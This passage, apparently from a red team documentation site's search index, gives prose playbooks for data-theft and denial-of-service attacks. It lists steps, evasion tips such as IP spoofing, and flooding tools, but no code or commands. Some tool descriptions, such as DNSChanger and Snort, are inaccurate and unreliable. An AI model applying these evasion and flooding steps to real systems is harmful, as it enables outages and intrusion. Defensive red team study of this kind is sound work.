misconfigured settings. By scanning the network, the attacker can pinpoint potential entry points for exploitation.Exploit identified vulnerabilities to gain initial access: Once vulnerabilities are identified, the attacker leverages exploit frameworks, which are collections of pre-written code or scripts designed to take advantage of specific vulnerabilities. By exploiting these weaknesses, the attacker gains initial access to the company's network, often through methods like remote code execution or privilege escalation.Escalate privileges and move laterally through the network: With initial access secured, the attacker seeks to escalate their privileges within the network, granting them greater control and access to sensitive resources. They may use various techniques and tools to move laterally through the network, such as exploiting trust relationships between systems or using stolen credentials to access additional machines.Locate and exfiltrate sensitive data: Once inside the network, the attacker's final objective is to locate and exfiltrate sensitive data. They may use specialized tools for lateral movement to navigate through the network and identify valuable information repositories. Once identified, the attacker uses techniques such as data exfiltration tools or file transfer protocols to steal and transfer sensitive data outside the company's network.  ","version":"Next","tagName":"h3"},{"title":"3.3 Tools and Techniques:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#33-tools-and-techniques","content":" Vulnerability scanners: Vulnerability scanners are automated tools that scan networks for known vulnerabilities in software, configurations, or protocols. They provide a comprehensive assessment of potential weaknesses, allowing organizations to prioritize and remediate security issues before they can be exploited by attackers.Exploit frameworks: Exploit frameworks are collections of software tools, scripts, and exploits designed to automate the process of identifying and exploiting vulnerabilities in computer systems or networks. These frameworks often include exploits for known vulnerabilities in popular software applications, operating systems, or network devices, enabling attackers to quickly compromise targeted systems.Lateral movement tools: Lateral movement tools are used by attackers to navigate laterally across a network, moving from one compromised system to another to escalate privileges and access sensitive resources. These tools exploit vulnerabilities in network protocols, operating systems, or applications to pivot between systems and maintain persistence within the network.  ","version":"Next","tagName":"h3"},{"title":"4. Data Breaches:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#4-data-breaches","content":"   ","version":"Next","tagName":"h2"},{"title":"4.1 Objective:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#41-objective","content":" Obtain access to confidential data stored by the company.  ","version":"Next","tagName":"h3"},{"title":"4.2 Steps:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#42-steps","content":" Identify weak points in the company's data storage systems: Attackers begin by assessing the company's data storage infrastructure to pinpoint vulnerabilities or weaknesses. They may use data scanning tools to analyze the organization's network and systems, looking for misconfigurations, unpatched software, or insecure access controls that could be exploited to gain unauthorized access to sensitive data.Exploit vulnerabilities to gain unauthorized access: Once potential weak points are identified, attackers utilize exploit kits, which are packages of pre-written code designed to automate the exploitation of known vulnerabilities in software or systems. By exploiting these vulnerabilities, attackers can bypass security controls and gain unauthorized access to the company's data storage systems.Locate and extract valuable data: With access to the company's data storage systems, attackers search for valuable data such as customer information, financial records, or intellectual property. They use various data exfiltration techniques to transfer the stolen data from the company's network to external servers or locations under their control, often employing encryption or obfuscation to avoid detection.  ","version":"Next","tagName":"h3"},{"title":"4.3 Tools and Techniques:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#43-tools-and-techniques","content":" Data scanning tools: Data scanning tools are software applications designed to scan and analyze an organization's network and systems for sensitive or confidential data. These tools can identify files or databases containing valuable information, such as credit card numbers, personal identifiers, or intellectual property, helping attackers prioritize their efforts and focus on high-value targets.Exploit kits: Exploit kits are collections of pre-packaged exploits, scripts, and tools that automate the process of exploiting known vulnerabilities in software or systems. Attackers deploy exploit kits to quickly and efficiently compromise target systems, bypassing security defenses and gaining unauthorized access to sensitive data. These kits often include exploits for commonly used software applications, web browsers, or operating systems.Data exfiltration techniques: Data exfiltration techniques are methods used by attackers to transfer stolen data from a compromised network to external servers or locations under their control. These techniques can include transferring data over encrypted channels, disguising data as legitimate traffic, or breaking up large files into smaller chunks to avoid detection. Attackers may also use covert channels or steganography to hide data within seemingly innocuous files or communications.  ","version":"Next","tagName":"h3"},{"title":"5. Phishing Attacks:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#5-phishing-attacks","content":"   ","version":"Next","tagName":"h2"},{"title":"5.1 Objective:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#51-objective","content":" Obtain login credentials or sensitive information through deceptive emails.  ","version":"Next","tagName":"h3"},{"title":"5.2 Steps:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#52-steps","content":" Create convincing phishing emails tailored to target employees: Attackers craft phishing emails designed to appear legitimate and compelling, often using information gathered from social media or company websites to personalize the messages. These emails typically contain urgent requests, enticing offers, or alarming warnings to prompt recipients to take action, such as clicking on links or providing sensitive information.Send phishing emails and monitor responses: Once the phishing emails are created, attackers use email spoofing tools to disguise the sender's identity and make the emails appear to come from trusted sources, such as colleagues or reputable organizations. They then send the phishing emails to targeted employees and monitor responses, tracking who interacts with the emails and how they respond.Collect login credentials or other desired information: When recipients fall for the phishing emails and click on malicious links or enter their login credentials, attackers use credential harvesting techniques to collect the stolen information. This may involve redirecting victims to fake login pages that mimic legitimate websites, capturing entered credentials in real-time, or storing harvested data for later use.  ","version":"Next","tagName":"h3"},{"title":"5.3 Tools and Techniques:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#53-tools-and-techniques","content":" Phishing email generators: Phishing email generators are software tools that automate the creation of deceptive phishing emails. These tools often provide customizable templates and options for personalizing messages to increase their effectiveness. Attackers use phishing email generators to quickly create convincing emails tailored to specific target audiences, enhancing the success rate of their phishing campaigns.Email spoofing tools: Email spoofing tools allow attackers to manipulate email headers and sender information to make phishing emails appear to come from trusted sources or legitimate email addresses. By spoofing the sender's identity, attackers can deceive recipients into believing that the phishing emails are genuine, increasing the likelihood of successful social engineering attacks.Credential harvesting: Credential harvesting techniques involve capturing and collecting login credentials or sensitive information entered by victims in response to phishing emails or fake web forms. Attackers use various methods, such as phishing websites that mimic legitimate login pages, keylogging software that records keystrokes, or form grabbing techniques that intercept data submitted through web forms. harvested credentials can then be used for unauthorized access to accounts or for further exploitation in targeted attacks.  ","version":"Next","tagName":"h3"},{"title":"6. Ransomware Attacks:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#6-ransomware-attacks","content":"   ","version":"Next","tagName":"h2"},{"title":"6.1 Objective:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#61-objective","content":" Encrypt critical files and demand ransom for decryption.  ","version":"Next","tagName":"h3"},{"title":"6.2 Steps:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#62-steps","content":" Gain initial access to the target network: Attackers first need to infiltrate the target network. They may accomplish this by exploiting vulnerabilities using tools like exploit kits, which automate the process of identifying and exploiting weaknesses in software or systems. Once inside, they can move laterally to find critical systems.Deploy ransomware payload on critical systems: After gaining access, attackers deploy the ransomware payload onto critical systems within the network. This can be done using various methods, including exploiting unpatched software vulnerabilities or using social engineering tactics to trick users into downloading and executing malicious files.Encrypt files and display ransom message: Once the ransomware payload is deployed, it begins encrypting files on the compromised systems, rendering them inaccessible to the victim. After encryption is complete, the ransomware typically displays a message demanding payment in exchange for the decryption key. This message often includes instructions on how to pay the ransom and regain access to the encrypted files.  ","version":"Next","tagName":"h3"},{"title":"6.3 Tools and Techniques:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#63-tools-and-techniques","content":" Ransomware-as-a-service platforms: Ransomware-as-a-service (RaaS) platforms are online services that allow individuals with limited technical expertise to create and distribute ransomware. These platforms provide a user-friendly interface and automated tools for generating customized ransomware payloads, enabling attackers to easily launch ransomware attacks without needing to develop their own malware from scratch.Exploit kits: Exploit kits are collections of pre-packaged exploits and tools designed to automate the process of identifying and exploiting vulnerabilities in software or systems. Attackers use exploit kits to quickly compromise target systems and gain initial access to the network, often exploiting vulnerabilities in web browsers, plugins, or other commonly used software.Payload delivery methods: Payload delivery methods refer to the techniques used by attackers to distribute and execute ransomware payloads on target systems. This can include methods such as phishing emails containing malicious attachments or links, drive-by downloads from compromised websites, or exploiting vulnerabilities in remote desktop protocols or file-sharing services. Once the ransomware payload is delivered and executed, it begins encrypting files on the victim's system.  ","version":"Next","tagName":"h3"},{"title":"7. Credential Theft:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#7-credential-theft","content":"     ","version":"Next","tagName":"h2"},{"title":"7.1 Objective:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#71-objective","content":" Obtain valid login credentials to gain unauthorized access.  ","version":"Next","tagName":"h3"},{"title":"7.2 Steps:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#72-steps","content":" Identify targets with valuable credentials: Attackers first identify individuals within the target organization who have access to valuable systems or sensitive information. They may target employees with high-level privileges or individuals with access to critical infrastructure.Use various methods to steal credentials (e.g., phishing, keylogging): Once targets are identified, attackers employ various techniques to steal their login credentials. Phishing involves sending deceptive emails or messages to trick individuals into revealing their credentials. Keyloggers are malicious software programs that record keystrokes, capturing usernames and passwords as they are entered.Test stolen credentials to verify access: After obtaining credentials, attackers test them to verify their validity and assess the level of access they provide. They may use automated tools like password spraying, which involves attempting to authenticate with multiple accounts using commonly used passwords or known password lists.  ","version":"Next","tagName":"h3"},{"title":"7.3 Tools and Techniques:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#73-tools-and-techniques","content":" Keyloggers: Keyloggers are software programs or hardware devices that record keystrokes typed by a user on a compromised system. These tools capture login credentials, passwords, and other sensitive information as they are entered, allowing attackers to steal credentials without the victim's knowledge.Credential harvesting tools: Credential harvesting tools are software applications designed to automate the process of collecting login credentials from compromised systems or networks. These tools may use techniques such as capturing credentials from network traffic, extracting passwords from browser caches, or exploiting vulnerabilities in authentication mechanisms to harvest credentials en masse.Password spraying: Password spraying is a brute-force attack technique used to gain unauthorized access to accounts by attempting to authenticate with a large number of usernames and a small set of commonly used passwords or known password lists. This technique helps attackers evade detection by avoiding rapid or repeated login attempts with the same credentials, making it harder for security systems to detect and block suspicious activity  ","version":"Next","tagName":"h3"},{"title":"8. Conclusion​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#8-conclusion","content":" In summary, the red team playbook for data theft response offers a comprehensive framework for assessing and bolstering defenses against cyber threats. By simulating real-world attack scenarios like insider threats, external attacks, data breaches, phishing, ransomware, and credential theft, the playbook helps organizations identify vulnerabilities and improve their detection and response capabilities. Through a blend of reconnaissance, exploitation, and the use of various tools and techniques, teams can better prepare to detect, respond to, and mitigate data theft incidents. Regular updates and refinements to the playbook ensure adaptability to evolving threats, reinforcing the organization's ability to safeguard sensitive data and maintain business continuity. Ultimately, the red team playbook is an essential resource for strengthening security posture and mitigating the risks associated with data theft. ","version":"Next","tagName":"h2"},{"title":"Denial of Service Red Team Usecase","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#1-introduction","content":" In the digital realm, the specter of Denial of Service (DoS) incidents looms large, threatening the very fabric of organizations' network infrastructure and online operations. With nefarious actors wielding an arsenal of techniques, they can cripple target systems, leaving them inaccessible to rightful users. This playbook serves as a beacon for red teams, illuminating the intricate landscape of DoS attack types and furnishing them with the tools to fortify defenses against such pernicious threats.  ","version":"Next","tagName":"h2"},{"title":"2. UDP Flood​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#2-udp-flood","content":"   ","version":"Next","tagName":"h2"},{"title":"2.1 Objective:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#21-objective","content":" The objective of conducting a UDP Flood attack is to overwhelm the target's network infrastructure by flooding it with UDP (User Datagram Protocol) packets, ultimately causing service disruption or downtime.  ","version":"Next","tagName":"h3"},{"title":"2.2 Red Team Usecases:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#22-red-team-usecases","content":" Network Stress Testing: Determine the resilience of the target's network infrastructure by simulating a UDP Flood attack to assess its ability to handle such traffic spikes.Service Disruption: Disrupt the availability of critical services such as web servers, DNS servers, or online gaming platforms to cause financial loss or reputation damage to the target organization.  ","version":"Next","tagName":"h3"},{"title":"2.3 Steps:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#23-steps","content":" Reconnaissance: Identify the target's network infrastructure, including IP addresses of servers and services to be targeted.Tool Selection: Choose appropriate tools for conducting the UDP Flood attack, such as Hping3, UDP Unicorn, or LOIC (Low Orbit Ion Cannon).Configuration: Configure the chosen tool to generate a high volume of UDP packets targeting the desired service or server. Specify the target IP address and port number.Execution: Execute the attack by initiating the flood of UDP packets towards the target infrastructure.Monitoring: Monitor the target's network for signs of service degradation or downtime caused by the flood of UDP packets.Obfuscation (Optional): Employ techniques like IP spoofing or distributed botnets to obfuscate the source of the attack and evade detection or mitigation effort.  ","version":"Next","tagName":"h3"},{"title":"2.4 Tools & Techniques:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#24-tools--techniques","content":" Hping3: Hping3 is a command-line tool used for generating and sending custom TCP/IP packets. It supports various protocols, including UDP, making it suitable for conducting UDP Flood attacks. Its flexibility allows users to customize packet size, frequency, and other parameters to suit the attack scenario.UDP Unicorn: UDP Unicorn is a lightweight tool specifically designed for UDP flooding. It enables attackers to generate a massive volume of UDP packets with minimal system resources. Its simple graphical interface makes it accessible even to less experienced attackers.LOIC (Low Orbit Ion Cannon): LOIC is an open-source network stress testing application. While originally intended for legitimate stress testing purposes, it has been repurposed by attackers for conducting DDoS attacks. LOIC's user-friendly interface and &quot;Hive Mind&quot; feature allow multiple users to coordinate simultaneous attacks, amplifying the impact of the UDP Flood.  ","version":"Next","tagName":"h3"},{"title":"3 TCP SYN Flood​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#3-tcp-syn-flood","content":"   ","version":"Next","tagName":"h2"},{"title":"3.1 Objective:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#31-objective","content":" The objective of executing a TCP SYN Flood attack as a red team is to overwhelm a target server or network with a flood of TCP SYN packets, exhausting its resources and rendering it unavailable to legitimate users. This attack can serve as a means to test the resilience of network defenses, simulate real-world cyber threats, and uncover potential vulnerabilities in network infrastructure.  ","version":"Next","tagName":"h3"},{"title":"3.2 Steps:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#32-steps","content":" Reconnaissance: Identify the target network's IP address and determine the target server(s) to be flooded.Tool Selection: Choose a suitable tool for conducting the TCP SYN Flood attack.Popular tools include Hping3, Scapy, and LOIC (Low Orbit Ion Cannon).Configuration: Configure the chosen tool to generate a high volume of TCP SYN packets towards the target server(s).Launch Attack: Initiate the TCP SYN Flood attack, sending a continuous stream of SYN packets to overwhelm the target server(s).Monitoring: Continuously monitor the impact of the attack on the target network, observing for signs of network degradation or service disruption.Adaptation: Adjust attack parameters if necessary to optimize effectiveness and evade detection by defensive measures.Analysis: Analyze the results of the attack to identify weaknesses in network defenses and propose mitigation strategies.  ","version":"Next","tagName":"h3"},{"title":"3.3 Tools & Techniques:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#33-tools--techniques","content":" Hping3: Hping3 is a command-line tool used for generating TCP/IP packets. It offers flexibility in crafting packets and allows for the creation of customized TCP SYN Flood attacks. Its scripting capabilities enable automation and fine-tuning of attack parameters.Scapy: Scapy is a powerful interactive packet manipulation program written in Python. It provides a Python interface for crafting and sending packets, making it highly customizable for creating TCP SYN Flood attacks. Its versatility allows for the creation of complex packet sequences to evade intrusion detection systems.LOIC (Low Orbit Ion Cannon): LOIC is a network stress testing application designed for conducting Distributed Denial of Service (DDoS) attacks. It simplifies the process of launching TCP SYN Flood attacks by providing a user-friendly interface. However,it lacks the sophistication and customization options of more advanced tools like Hping3 and Scapy.  ","version":"Next","tagName":"h3"},{"title":"4 HTTP Flood​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#4-http-flood","content":"   ","version":"Next","tagName":"h2"},{"title":"4.1 Objective:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#41-objective","content":" The objective of the HTTP Flood DDoS playbook is to simulate a coordinated attack on a web server, overwhelming it with a high volume of HTTP requests.  ","version":"Next","tagName":"h3"},{"title":"4.2 Steps:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#42-steps","content":" Reconnaissance: a. Gather information about the target web server, including its IP address, domain name, and any other relevant details. b. Identify potential vulnerabilities in the web server software or infrastructure that could be exploited during the attack.Preparation: a. Set up the attack infrastructure, including the deployment of multiple attack machines or botnets capable of generating a large volume of HTTP requests. b. Configure the attack tools to target the specific URL or endpoints on the web server.Execution: a. Initiate the HTTP Flood attack by sending a massive number of HTTP requests to the target web server simultaneously. b. Continuously monitor the performance of the attack to ensure that it is achieving the desired impact and overwhelming the target's resource.Evasion: a. Implement evasion techniques to bypass any detection or mitigation measures deployed by the target organization, such as IP spoofing or distributed routing. b. Modify the characteristics of the attack traffic to mimic legitimate user behavior and avoid triggering alarms.Persistence: a. Maintain the intensity of the attack over an extended period to maximize its impact on the target's operations. b. Dynamically adjust the parameters of the attack based on the target's response to evade detection and prolong the duration of the attack.  ","version":"Next","tagName":"h3"},{"title":"4.3 Tools & Techniques:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#43-tools--techniques","content":" HTTP Flood Tools:HULK (HTTP Unbearable Load King): A tool designed to generate a massive volume of HTTP requests, overwhelming the target web server's resources.LOIC (Low Orbit Ion Cannon): While originally developed for stress testing, it can be misused for DDoS attacks by flooding the target with HTTP requests.Xerxes: Another tool that enables users to launch HTTP Flood attacks, capable of generating a high volume of traffic to the target.Evasion Techniques:IP Spoofing: Falsifying the source IP address of the attack packets to make them appear to originate from legitimate sources, making it harder to trace back to the attacker.Randomized User Agents: Varying the User-Agent header in HTTP requests to mimic different types of web browsers and devices, making the attack traffic appear more like legitimate user activity.Session Persistence: Maintaining persistent connections to the target server to avoid detection by bypassing rate limiting or connection-based filtering mechanisms.  Monitoring Tools:​  Wireshark: A network protocol analyzer that can be used to capture and inspect the traffic generated by the HTTP Flood attack, allowing the attacker to analyze its effectiveness and detect any anomalies.Nmap: A versatile network scanning tool that can be used to identify open ports and services on the target web server, providing valuable information for reconnaissance and attack planning.Snort: An open-source intrusion detection system (IDS) that can be deployed to detect and alert on suspicious network activity, helping the attacker assess the effectiveness of evasion techniques and adjust the attack accordingly.  ","version":"Next","tagName":"h2"},{"title":"5 Ping Flood (ICMP Flood)​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#5-ping-flood-icmp-flood","content":"   ","version":"Next","tagName":"h2"},{"title":"5.1 Objective:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#51-objective","content":" The objective of executing a Ping Flood (ICMP Flood) attack as a red team is to overwhelm a target network or host with a flood of ICMP echo request packets, causing network congestion, service degradation, or denial of service. This attack helps assess the resilience of network infrastructure, test intrusion detection and prevention systems, and identify potential weaknesses in network defenses.  ","version":"Next","tagName":"h3"},{"title":"5.2 Steps:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#52-steps","content":" Reconnaissance: Identify the target network or host and determine the IP address(es) to be flooded.Tool Selection: Choose a suitable tool for conducting the Ping Flood attack. Common tools include hping3, Scapy, and Nping.Configuration: Configure the chosen tool to generate a high volume of ICMP echo request packets targeting the specified IP address(es). Launch Attack: Initiate the Ping Flood attack, sending a continuous stream of ICMP echo request packets to overwhelm the target network or host.Monitoring: Continuously monitor the impact of the attack on the target, observing for network latency, packet loss, and service disruptions.Adaptation: Adjust attack parameters if necessary to optimize effectiveness and evade detection by network defenses.Analysis: Analyze the results of the attack to identify vulnerabilities, assess the effectiveness of network defenses, and propose mitigation strategies.  ","version":"Next","tagName":"h3"},{"title":"5.3 Tools & Techniques:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#53-tools--techniques","content":" hping3: hping3 is a command-line tool used for sending custom TCP/IP packets. It supports various types of attacks, including Ping Flood, and allows for precise control over packet parameters such as TTL (Time To Live) and packet size. Its scripting capabilities enable automation and fine-tuning of attack parameters to suit specific objectives.Scapy: Scapy is a versatile packet manipulation tool written in Python. It provides a powerful interface for crafting and sending packets, making it ideal for conducting ICMP Flood attacks. Scapy's flexibility allows for the creation of custom packet payloads and the simulation of complex network scenarios.Nping: Nping is a command-line tool that is part of the Nmap suite of network scanning tools. It is designed for network packet generation, response analysis, and response time measurement. Nping's features include the ability to specify packet timing, payload data, and target hosts, making it suitable for conducting ICMP Flood attacks in a controlled manner.  ","version":"Next","tagName":"h3"},{"title":"6 Slowloris​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#6-slowloris","content":"   ","version":"Next","tagName":"h2"},{"title":"6.1 Objective:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#61-objective","content":" The objective of executing a Slowloris attack as a red team is to perform a low and slow HTTP Denial of Service (DoS) attack by keeping multiple connections to the target web server open for as long as possible, exhausting its resources and rendering it unavailable to legitimate users. This attack helps assess the resilience of web servers, test intrusion detection systems, and identify potential vulnerabilities in web application security.  ","version":"Next","tagName":"h3"},{"title":"6.2 Steps:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#62-steps","content":" Reconnaissance: Identify the target web server and determine its IP address and listening ports.Tool Selection: Choose a suitable tool for conducting the Slowloris attack. Common tools include Slowloris (Perl script), PyLoris (Python script), and R.U.D.Y (R-U-Dead-Yet).Configuration: Configure the chosen tool to establish multiple concurrent connections to the target web server and send partial HTTP requests, keeping each connection open for an extended period.Launch Attack: Initiate the Slowloris attack by sending HTTP headers slowly and incrementally to the target web server, consuming its available connections and resources.Monitoring: Continuously monitor the impact of the attack on the target server,observing for increased response times, connection timeouts, and service disruptions.Adaptation: Adjust attack parameters if necessary to prolong the duration of connections and evade detection by defensive measures.Analysis: Analyze the results of the attack to identify weaknesses in web server configurations, assess the effectiveness of intrusion detection systems, and propose mitigation strategies.  ","version":"Next","tagName":"h3"},{"title":"6.3 Tools & Techniques:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#63-tools--techniques","content":" Slowloris (Perl script): Slowloris is a Perl script designed to perform a Slowloris-style HTTP DoS attack. It works by opening multiple connections to the target web server and sending partial HTTP requests, keeping each connection open by periodically sending additional headers. Slowloris's simplicity and effectiveness make it a popular choice for red teams conducting web server stress testing.PyLoris (Python script): PyLoris is a Python-based implementation of the Slowloris attack. It offers similar functionality to the original Slowloris script but is written in Python, making it more accessible to users familiar with the Python programming language. PyLoris provides additional features such as support for SSL/TLS connections and customizable attack parameters, enhancing its versatility for red team engagements.R.U.D.Y (R-U-Dead-Yet): R.U.D.Y is another HTTP DoS attack tool that follows a similar slow and low approach to Slowloris. It focuses on sending POST requests with a large content length, keeping each connection open by sending a continuous stream of POST data slowly. R.U.D.Y's ability to target web applications vulnerable to resource exhaustion makes it a valuable tool for red teams assessing web server security.  ","version":"Next","tagName":"h3"},{"title":"7 DNS Amplification​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#7-dns-amplification","content":"   ","version":"Next","tagName":"h2"},{"title":"7.1 Objective:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#71-objective","content":" The objective of executing a DNS Amplification attack as a red team is to leverage vulnerable DNS servers to amplify a small number of DNS queries into a flood of responses directed towards a target victim, causing network congestion, service disruption, or denial of service. This attack helps assess the resilience of network infrastructure, test the effectiveness of DDoS mitigation measures, and identify potential vulnerabilities in DNS server configurations.  ","version":"Next","tagName":"h3"},{"title":"7.2 Steps:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#72-steps","content":" Reconnaissance: Identify vulnerable DNS servers that support DNS amplification, typically open or misconfigured DNS resolvers with recursion enabled.Tool Selection: Choose a suitable tool for conducting the DNS Amplification attack.Common tools include DNSRecon, dnsenum, and dnsmap for reconnaissance, and tools like DNSChanger, dns2tcp, and Nslookup for performing the actual attack.Configuration: Configure the chosen tool to send DNS queries with a spoofed source IP address of the target victim and a DNS query for a large DNS record type (e.g., DNS ANY query).Launch Attack: Initiate the DNS Amplification attack by sending crafted DNS queries to the vulnerable DNS servers, causing them to send large responses to the target victim's IP address.Monitoring: Continuously monitor the impact of the attack on the target victim, observing for increased network traffic, DNS response times, and service disruptions.Adaptation: Adjust attack parameters if necessary to optimize amplification and evasion of detection by network defenses or DNS monitoring systems.Analysis: Analyze the results of the attack to identify weaknesses in DNS server configurations, assess the effectiveness of DDoS mitigation measures, and propose mitigation strategies.  ","version":"Next","tagName":"h3"},{"title":"7.3 Tools & Techniques:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#73-tools--techniques","content":" DNSRecon: DNSRecon is a DNS enumeration tool designed for reconnaissance purposes. It helps identify DNS servers, zone transfers, and DNS records associated with a target domain. DNSRecon's features include brute-force DNS subdomain enumeration and reverse DNS lookups, making it useful for identifying potential targets for DNS Amplification attacks.DNSChanger: DNSChanger is a tool used for crafting and sending DNS queries with custom parameters. It supports various DNS record types and allows for the spoofing of source IP addresses, making it suitable for performing DNS Amplification attacks.DNSChanger's simplicity and effectiveness make it a preferred choice for red teams conducting network stress testing.Nslookup: Nslookup is a command-line tool used for querying DNS servers to obtain DNS information. While not specifically designed for conducting DNS Amplification attacks, Nslookup can be used to send DNS queries to vulnerable DNS servers for reconnaissance purposes. Its simplicity and availability on most operating systems make it a handy tool for red teams during penetration testing engagements.  ","version":"Next","tagName":"h3"},{"title":"8 NTP Amplification​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#8-ntp-amplification","content":"   ","version":"Next","tagName":"h2"},{"title":"8.1 Objective:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#81-objective","content":" The objective of executing an NTP (Network Time Protocol) Amplification attack as a red team is to exploit vulnerable NTP servers to amplify a small number of NTP queries into a flood of responses directed towards a target victim, causing network congestion, service disruption, or denial of service. This attack helps assess the resilience of network infrastructure, test the effectiveness of DDoS mitigation measures, and identify potential vulnerabilities in NTP server configurations.  ","version":"Next","tagName":"h3"},{"title":"8.2 Steps:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#82-steps","content":" Reconnaissance: Identify vulnerable NTP servers that support NTP amplification, typically open or misconfigured NTP servers with monlist enabled.Tool Selection: Choose a suitable tool for conducting the NTP Amplification attack.Common tools include Nmap, NTPScan, and NTPMonlist for reconnaissance, and tools like NTPDOS, NTPFlood, and 